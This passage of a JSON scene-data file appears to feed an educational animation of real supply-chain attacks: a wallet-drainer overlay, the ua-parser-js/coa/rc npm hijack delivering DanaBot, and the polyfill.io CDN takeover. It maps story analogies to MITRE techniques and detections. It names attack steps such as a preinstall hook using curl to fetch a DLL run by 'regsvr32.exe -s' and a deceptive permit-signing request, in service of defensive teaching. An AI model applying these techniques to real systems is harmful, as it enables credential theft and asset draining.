          "subtitle": "Legitimate victim domain URL bar lending visual authenticity…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Over",
          "stageTag": "STEP 03 · SETUP",
          "title": "Crystal-clear counterfeit prompt over the trusted…",
          "storyExcerpt": "On cue from the live radio channel, the hijacked animation player drops a crystal-clear counterfeit prompt straight over the trusted storefront window, fooling visitors into signing a sweeping…",
          "technicalParallel": "Under the hood, the observed step executes document.body.appendChild(walletConnectOverlayModal) -> window.ethereum.request({ method: \"eth_signTypedData_v4\", params: [victimAddr, permit2Payload] }) (which…",
          "accentHex": "#22D3EE",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Host Site",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Host site own trusted banner",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses host site own trusted banner to advance toward sweeping vault-transfer slip.",
          "technicalParallel": "Instructed by wss://castleservices.org, the injected script renders a pixel-perfect modal overlay inside the trusted web app’s DOM prompting the user to \"Verify Wallet Connection\", tricking them into…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Slip",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Direct asset transfer to the attacker",
          "storyExcerpt": "Behind the scenes, direct asset transfer to the attacker captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented in SIEM Event 1001 (recording DrainerFamily=AceDrainer, RpcMethodAbused=eth_signTypedData_v4 / eth_sendTransaction, DefenseControl=Subresource Integrity , SRI + CSP connect-src under T1185)…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Flipbook Line",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Radio Beacon",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Package Push",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1185"
    }
  },
  "npm-ua-parser-js-coa-rc-supply-chain": {
    "briefing": {
      "scenarioId": "npm-ua-parser-js-coa-rc-supply-chain",
      "sectionKey": "briefing",
      "sceneKind": "sup-npm-uaparser-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1195.001",
      "title": "NPM High-Impact Package Hijack (ua-parser-js / coa / rc) & DanaBot Stealer — Story-to-Technical Overview",
      "storyCue": "Imagine a hardware wholesaler whose tiny brass screws are packed automatically inside millions of furniture kits across the world. Attackers steal the wholesaler warehouse login because no second-factor pocket code was required, slip an automatic spring-loaded trap inside the screw box lid so every carpenter who opens the box unknowingly fetches a lockpicking kit, and silently launches a credential thief using a trusted built-in workshop tool.",
      "technicalCue": "INITIAL ACCESS: Maintainer Account Takeover & Malicious preinstall Hook Publish -> EXECUTION: Automatic preinstall Execution & curl Download of sdd.dll -> DEFENSE EVASION: Silent regsvr32.exe -s Execution & DanaBot Credential Theft",
      "storyMappings": [
        {
          "storyTerm": "Tiny brass screws packed inside millions of kits",
          "technicalTerm": "Foundational transitive NPM packages ua-parser-js, coa, and rc",
          "tone": "amber"
        },
        {
          "storyTerm": "Warehouse login lacking a pocket code",
          "technicalTerm": "Compromised NPM maintainer accounts without 2FA enforcement",
          "tone": "sky"
        },
        {
          "storyTerm": "Spring-loaded trap inside the box lid",
          "technicalTerm": "Malicious package.json preinstall hook running preinstall.js and compile.bat",
          "tone": "rose"
        },
        {
          "storyTerm": "Launching a credential thief with a trusted workshop tool",
          "technicalTerm": "regsvr32.exe -s create.dll executing the DanaBot password stealer silently",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-npm-uaparser-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Tiny brass screws packed inside millions…",
          "subtitle": "Foundational transitive NPM packages ua-parser-js, coa, and rc",
          "tone": "amber"
        },
        {
          "id": "sup-npm-uaparser-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Warehouse login lacking a pocket code",
          "subtitle": "Compromised NPM maintainer accounts without 2FA enforcement",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Lock",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Maintainer Account Takeover & Malicious preinstall Hook Publish",
          "storyExcerpt": "Breaking into a busy component-maker shipping account that lacked a second pocket-code lock, the intruder releases a tiny routine-looking version bump containing a spring-loaded lid script designed to…",
          "technicalParallel": "Because many upstream libraries declare loose semver ranges (such as ^0.7.0 or ^2.0.0), any developer or CI job running npm install without a strict lockfile automatically pulled the newly published…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Code",
          "stageTag": "STAGE 02 · EXECUTION",
          "title": "Automatic preinstall Execution & curl Download of sdd.dll",
          "storyExcerpt": "The moment a developer runs a routine morning toolbox refresh, the spring-loaded lid checks whether the workshop runs Windows or Linux, triggers a hidden helper script, and reaches outside the building…",
          "technicalParallel": "On Linux workstations and CI containers, the script instead executed preinstall.sh to download and run an ELF cryptominer binary (jsextension).",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Set Mute",
          "stageTag": "STAGE 03 · DEFENSE EVASION",
          "title": "Silent regsvr32.exe -s Execution & DanaBot Credential Theft",
          "storyExcerpt": "Rather than running an unfamiliar executable that guards would immediately question, the helper script hands the stolen espionage module to the workshop own official parts-registration machine set on…",
          "technicalParallel": "Because developers frequently hold privileged AWS, GitHub, and production SSH credentials on their laptops, CISA warned that any workstation that installed these versions had to be treated as fully…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Parts Line",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Crate Dock",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Install Hook",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "npm-ua-parser-js-coa-rc-supply-chain",
      "sectionKey": "step-1",
      "sceneKind": "sup-npm-uaparser-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Maintainer Account Takeover & Malicious preinstall Hook Publish",
      "storyCue": "Breaking into a busy component-maker shipping account that lacked a second pocket-code lock, the intruder releases a tiny routine-looking version bump containing a spring-loaded lid script designed to snap open the instant any workshop unpacks the crate.",
      "technicalCue": "T1195.001 · INITIAL ACCESS — By compromising maintainer npm credentials that did not enforce two-factor authentication (2FA) for package publishing, the threat actor pushed trojanized versions (ua-parser-js@0.7.29…",
      "storyMappings": [
        {
          "storyTerm": "Component-maker account lacking a pocket-code lock",
          "technicalTerm": "Maintainer NPM account without two-factor authentication (2FA) for publishing",
          "tone": "amber"
        },
        {
          "storyTerm": "Routine-looking version bump",
          "technicalTerm": "Malicious patch versions published for ua-parser-js, coa, and rc",
          "tone": "sky"
        },
        {
          "storyTerm": "Spring-loaded lid script",
          "technicalTerm": "package.json preinstall lifecycle hook executing automatically on install",
          "tone": "rose"
        },
        {
          "storyTerm": "Workshops pulling the crate transitively",
          "technicalTerm": "Millions of downstream Node.js builds auto-resolving caret dependency ranges",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-npm-uaparser-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Component-maker account lacking a…",
          "subtitle": "Maintainer NPM account without two-factor authentication (2FA)…",
          "tone": "amber"
        },
        {
          "id": "sup-npm-uaparser-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Routine-looking version bump",
          "subtitle": "Malicious patch versions published for ua-parser-js, coa, and rc",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Lock",
          "stageTag": "STEP 01 · SETUP",
          "title": "Component-maker account lacking a pocket-code lock",
          "storyExcerpt": "Breaking into a busy component-maker shipping account that lacked a second pocket-code lock, the intruder releases a tiny routine-looking version bump containing a spring-loaded lid script…",
          "technicalParallel": "Because many upstream libraries declare loose semver ranges (such as ^0.7.0 or ^2.0.0), any developer or CI job running npm install without a strict lockfile automatically pulled the newly published…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Bump",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Routine-looking version bump",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses routine-looking version bump to advance toward spring-loaded lid script.",
          "technicalParallel": "By compromising maintainer npm credentials that did not enforce two-factor authentication (2FA) for package publishing, the threat actor pushed trojanized versions (ua-parser-js@0.7.29, coa@2.0.3…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Busy Lock",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Workshops pulling the crate transitively",
          "storyExcerpt": "Behind the scenes, workshops pulling the crate transitively captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "SCA package diff scanners (e.g., Socket.dev or Sonatype Nexus Firewall) blocking newly published versions that introduce preinstall or postinstall scripts.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Parts Line",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Crate Dock",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Install Hook",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.001"
    },
    "step-2": {
      "scenarioId": "npm-ua-parser-js-coa-rc-supply-chain",
      "sectionKey": "step-2",
      "sceneKind": "sup-npm-uaparser-step-2",
      "stageBadge": "STEP #2 · EXECUTION",
      "title": "Automatic preinstall Execution & curl Download of sdd.dll",
      "storyCue": "The moment a developer runs a routine morning toolbox refresh, the spring-loaded lid checks whether the workshop runs Windows or Linux, triggers a hidden helper script, and reaches outside the building to download a concealed espionage module straight into the local parts bin.",
      "technicalCue": "T1059.007 · EXECUTION — When npm install ran on a developer workstation, node.exe executed preinstall.js, which fingerprinted the host OS (process.platform) and on Windows spawned cmd.exe /c compile.bat to invoke curl…",
      "storyMappings": [
        {
          "storyTerm": "Routine morning toolbox refresh",
          "technicalTerm": "Developer or CI runner executing npm install",
          "tone": "amber"
        },
        {
          "storyTerm": "Checking whether the workshop runs Windows or Linux",
          "technicalTerm": "preinstall.js inspecting process.platform to branch payloads by OS",
          "tone": "sky"
        },
        {
          "storyTerm": "Hidden helper script fetching the module",
          "technicalTerm": "node.exe spawning cmd.exe /c compile.bat invoking curl.exe",
          "tone": "rose"
        },
        {
          "storyTerm": "Concealed espionage module in the local parts bin",
          "technicalTerm": "Downloaded sdd.dll (create.dll) staged inside node_modules",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#F59E0B",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-npm-uaparser-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Routine morning toolbox refresh",
          "subtitle": "Developer or CI runner executing npm install",
          "tone": "amber"
        },
        {
          "id": "sup-npm-uaparser-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Checking whether the workshop runs…",
          "subtitle": "preinstall.js inspecting process.platform to branch payloads…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Runs Lid",
          "stageTag": "STEP 02 · SETUP",
          "title": "Routine morning toolbox refresh",
          "storyExcerpt": "The moment a developer runs a routine morning toolbox refresh, the spring-loaded lid checks whether the workshop runs Windows or Linux, triggers a hidden helper script, and reaches outside the…",
          "technicalParallel": "On Linux workstations and CI containers, the script instead executed preinstall.sh to download and run an ELF cryptominer binary (jsextension).",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Runs",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Checking whether the workshop runs Windows or Linux",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses checking whether the workshop runs windows or linux to advance toward hidden helper script fetching the module.",
          "technicalParallel": "When npm install ran on a developer workstation, node.exe executed preinstall.js, which fingerprinted the host OS (process.platform) and on Windows spawned cmd.exe /c compile.bat to invoke curl…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Runs Lid",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Concealed espionage module in the local parts bin",
          "storyExcerpt": "Behind the scenes, concealed espionage module in the local parts bin captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Alert on Sysmon EventID 1 (Process Creation recording full parent-child lineage) showing node.exe spawning cmd.exe /c compile.bat followed by curl.exe downloading .dll or .exe binaries into node_modules…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Parts Line",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Crate Dock",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Install Hook",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1059.007"
    },
    "step-3": {
      "scenarioId": "npm-ua-parser-js-coa-rc-supply-chain",
      "sectionKey": "step-3",
      "sceneKind": "sup-npm-uaparser-step-3",
      "stageBadge": "STEP #3 · DEFENSE EVASION",
      "title": "Silent regsvr32.exe -s Execution & DanaBot Credential Theft",
      "storyCue": "Rather than running an unfamiliar executable that guards would immediately question, the helper script hands the stolen espionage module to the workshop own official parts-registration machine set on mute, silently awakening a password thief that sweeps browser vaults and developer keys.",
      "technicalCue": "T1218.010 · DEFENSE EVASION — The batch file executed regsvr32.exe -s create.dll (abusing the signed Microsoft COM registration utility with the -s silent flag to invoke the DLL’s DllRegisterServer export without displaying…",
      "storyMappings": [
        {
          "storyTerm": "Official parts-registration machine set on mute",
          "technicalTerm": "Signed Microsoft COM utility regsvr32.exe invoked with the -s silent flag",
          "tone": "amber"
        },
        {
          "storyTerm": "Awakening the password thief inside the machine",
          "technicalTerm": "regsvr32.exe -s create.dll invoking DllRegisterServer for DanaBot",
          "tone": "sky"
        },
        {
          "storyTerm": "Sweeping browser vaults and developer keys",
          "technicalTerm": "DanaBot credential harvesting across browser profiles, SSH keys, and tokens",
          "tone": "rose"
        },
        {
          "storyTerm": "Blending past front-gate guard checks",
          "technicalTerm": "Living-off-the-land signed binary proxy execution (MITRE T1218.010)",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-npm-uaparser-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Official parts-registration machine set…",
          "subtitle": "Signed Microsoft COM utility regsvr32.exe invoked with the -s…",
          "tone": "amber"
        },
        {
          "id": "sup-npm-uaparser-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Awakening the password thief inside the…",
          "subtitle": "regsvr32.exe -s create.dll invoking DllRegisterServer for…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Set Mute",
          "stageTag": "STEP 03 · SETUP",
          "title": "Official parts-registration machine set on mute",
          "storyExcerpt": "Rather than running an unfamiliar executable that guards would immediately question, the helper script hands the stolen espionage module to the workshop own official parts-registration machine…",
          "technicalParallel": "Because developers frequently hold privileged AWS, GitHub, and production SSH credentials on their laptops, CISA warned that any workstation that installed these versions had to be treated as fully…",
          "accentHex": "#F59E0B",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses Keys",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Awakening the password thief inside the machine",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses awakening the password thief inside the machine to advance toward sweeping browser vaults and developer keys.",
          "technicalParallel": "The batch file executed regsvr32.exe -s create.dll (abusing the signed Microsoft COM registration utility with the -s silent flag to invoke the DLL’s DllRegisterServer export without displaying error…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Keys",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Blending past front-gate guard checks",
          "storyExcerpt": "Behind the scenes, blending past front-gate guard checks captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Sysmon EventID 1 & 7 showing regsvr32.exe loading an unsigned DLL (create.dll / sdd.dll) from a node_modules directory.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Parts Line",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Crate Dock",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Install Hook",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1218.010"
    }
  },
  "polyfill-io-cdn-domain-supply-chain": {
    "briefing": {
      "scenarioId": "polyfill-io-cdn-domain-supply-chain",
      "sectionKey": "briefing",
      "sceneKind": "sup-polyfill-cdn-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1195.002",
      "title": "cdn.polyfill.io CDN Domain Takeover & Conditional JS Injection… — Story-to-Technical Overview",
      "storyCue": "Imagine over a hundred thousand storefronts that all hang a shared decorative banner delivered daily from one outside sign-maker, without ever checking a tamper-proof weight seal on the banner. After a shady new owner buys the sign-maker warehouse, they quietly check who is walking into each store, slip a hidden pickpocket script only onto mobile shoppers visiting select stores, and hijack shoppers right inside the storefront trusted showroom.",
      "technicalCue": "INITIAL ACCESS: Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI) -> DEFENSE EVASION: HTTP User-Agent Fingerprinting & Evasive Payload Generation -> EXFIL & IMPACT: First-Party DOM Execution & Silent Session Hijack / Redirection",
      "storyMappings": [
        {
          "storyTerm": "Shared banner hung without a tamper-proof weight seal",
          "technicalTerm": "External <script src=\"https://cdn.polyfill.io/...\"> lacking Subresource Integrity (SRI)",
          "tone": "amber"
        },
        {
          "storyTerm": "Shady new owner checking who walks into each store",
          "technicalTerm": "Compromised cdn.polyfill.io fingerprinting HTTP User-Agent, Referer, and geolocation",
          "tone": "sky"
        },
        {
          "storyTerm": "Hidden pickpocket script served conditionally",
          "technicalTerm": "Time-delayed dynamic JavaScript payload redirecting mobile visitors (CVE-2024-38526)",
          "tone": "rose"
        },
        {
          "storyTerm": "Operating inside the storefront trusted showroom",
          "technicalTerm": "Full first-party Same-Origin Policy (DOM and cookie) execution context",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "sup-polyfill-cdn-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Shared banner hung without a…",
          "subtitle": "External <script src=\"https://cdn.polyfill.io/...\"> lacking…",
          "tone": "amber"
        },
        {
          "id": "sup-polyfill-cdn-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Shady new owner checking who walks into…",
          "subtitle": "Compromised cdn.polyfill.io fingerprinting HTTP User-Agent…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Hung Seal",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI)",
          "storyExcerpt": "More than a hundred thousand online shops paste an outside helper banner straight onto their front counter without attaching a cryptographic wax seal, blindly trusting that whatever the remote sign…",
          "technicalParallel": "When ownership of the polyfill.io DNS domain changed hands in 2024, the new owner automatically inherited the ability to execute arbitrary JavaScript inside the first-party origin of every website still…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Hat Home",
          "stageTag": "STAGE 02 · DEFENSE EVASION",
          "title": "HTTP User-Agent Fingerprinting & Evasive Payload Generation",
          "storyExcerpt": "When a browser asks the hijacked warehouse for the helper script, the clerk behind the counter peeks at the visitor hat, shoes, and home town: security inspectors on desktop browsers receive a spotless…",
          "technicalParallel": "The injected code also wrapped its execution in a 15-second setTimeout delay so automated headless browser scanners that only observe a page for 3–5 seconds after load would mark the script as clean.",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Onto",
          "stageTag": "STAGE 03 · EXFIL & IMPACT",
          "title": "First-Party DOM Execution & Silent Session Hijack / Redirection",
          "storyExcerpt": "Because the storefront invited the outside script directly onto its own showroom floor, the browser treats the pickpocket as an official store employee, letting it inspect every customer tray, load…",
          "technicalParallel": "To neutralize the blast radius across the web, Cloudflare deployed automatic edge URL rewriting to swap cdn.polyfill.io with a clean mirror at cdnjs.cloudflare.com/polyfill, and the domain registrar…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "CDN Tower",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Store Mirror",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Script Swap",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "polyfill-io-cdn-domain-supply-chain",
      "sectionKey": "step-1",
      "sceneKind": "sup-polyfill-cdn-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI)",
      "storyCue": "More than a hundred thousand online shops paste an outside helper banner straight onto their front counter without attaching a cryptographic wax seal, blindly trusting that whatever the remote sign warehouse sends tomorrow will be identical to what it sent years ago.",
      "technicalCue": "T1195.002 · INITIAL ACCESS — Over 100,000 websites embedded <script src=\"https://cdn.polyfill.io/v2/polyfill.min.js\"></script> without a Subresource Integrity (SRI) hash (integrity=\"sha384-...\", a browser security…",
      "storyMappings": [
        {
          "storyTerm": "Outside helper banner on the front counter",
          "technicalTerm": "<script src=\"https://cdn.polyfill.io/v2/polyfill.min.js\"> embedded in web pages",
          "tone": "amber"
        },
        {
          "storyTerm": "Missing cryptographic wax seal",
          "technicalTerm": "Absence of integrity=\"sha384-...\" Subresource Integrity (SRI) verification",
          "tone": "sky"
        },
        {
          "storyTerm": "Shady new owner buying the sign warehouse",
          "technicalTerm": "Acquisition and weaponization of the polyfill.io domain and CDN infrastructure",
          "tone": "rose"
        },
        {
          "storyTerm": "Instant exposure across a hundred thousand shops",
          "technicalTerm": "Supply-chain fan-out affecting every site referencing the unpinned CDN domain",
          "tone": "emerald"
        }
      ],
      "accentHex": "#A855F7",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-polyfill-cdn-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Outside helper banner on the front counter",
          "subtitle": "<script src=\"https://cdn.polyfill.io/v2/polyfill.min.js\">…",
          "tone": "amber"
        },
        {
          "id": "sup-polyfill-cdn-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Missing cryptographic wax seal",
          "subtitle": "Absence of integrity=\"sha384-...\" Subresource Integrity (SRI)…",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. More Than",
          "stageTag": "STEP 01 · SETUP",
          "title": "Outside helper banner on the front counter",
          "storyExcerpt": "More than a hundred thousand online shops paste an outside helper banner straight onto their front counter without attaching a cryptographic wax seal, blindly trusting that whatever the remote…",
          "technicalParallel": "When ownership of the polyfill.io DNS domain changed hands in 2024, the new owner automatically inherited the ability to execute arbitrary JavaScript inside the first-party origin of every website still…",
          "accentHex": "#A855F7",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Wax Seal",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Missing cryptographic wax seal",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses missing cryptographic wax seal to advance toward shady new owner buying the sign warehouse.",
          "technicalParallel": "Over 100,000 websites embedded <script src=\"https://cdn.polyfill.io/v2/polyfill.min.js\"></script> without a Subresource Integrity (SRI) hash (integrity=\"sha384-...\", a browser security attribute that…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. New Sign",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Instant exposure across a hundred thousand shops",
          "storyExcerpt": "Behind the scenes, instant exposure across a hundred thousand shops captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Client-side script inventory scanners (Cloudflare Page Shield, Sansec) enumerating external <script> tags lacking integrity attributes or referencing deprecated domains.",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "CDN Tower",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Store Mirror",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Script Swap",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1195.002"
    },
    "step-2": {
      "scenarioId": "polyfill-io-cdn-domain-supply-chain",
      "sectionKey": "step-2",
      "sceneKind": "sup-polyfill-cdn-step-2",
      "stageBadge": "STEP #2 · DEFENSE EVASION",
      "title": "HTTP User-Agent Fingerprinting & Evasive Payload Generation",
      "storyCue": "When a browser asks the hijacked warehouse for the helper script, the clerk behind the counter peeks at the visitor hat, shoes, and home town: security inspectors on desktop browsers receive a spotless normal script, while real mobile shoppers silently receive a delayed hijacking payload.",
      "technicalCue": "T1027 · DEFENSE EVASION — The compromised cdn.polyfill.io server evaluated each request’s HTTP User-Agent, Referer, and geolocation headers on the fly, appending heavily obfuscated JavaScript only for targeted mobile…",
      "storyMappings": [
        {
          "storyTerm": "Peeking at the visitor hat, shoes, and home town",
          "technicalTerm": "Server-side inspection of HTTP User-Agent, Referer, and GeoIP headers",
          "tone": "amber"
        },
        {
          "storyTerm": "Spotless script handed to desktop security inspectors",
          "technicalTerm": "Conditional evasion serving benign polyfills to automated scanners and researchers",
          "tone": "sky"
        },
        {
          "storyTerm": "Delayed hijacking payload handed to mobile shoppers",
          "technicalTerm": "Obfuscated redirector script firing after a delay on targeted mobile sessions",
          "tone": "rose"
        },
        {
          "storyTerm": "Hijacked sign warehouse",
          "technicalTerm": "Attacker-operated cdn.polyfill.io edge server generating tailored responses",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#A855F7",
      "durationSec": 15,
      "callouts": [
        {
          "id": "sup-polyfill-cdn-step-2-left",
          "tag": "STEP 2 · FOCUS",
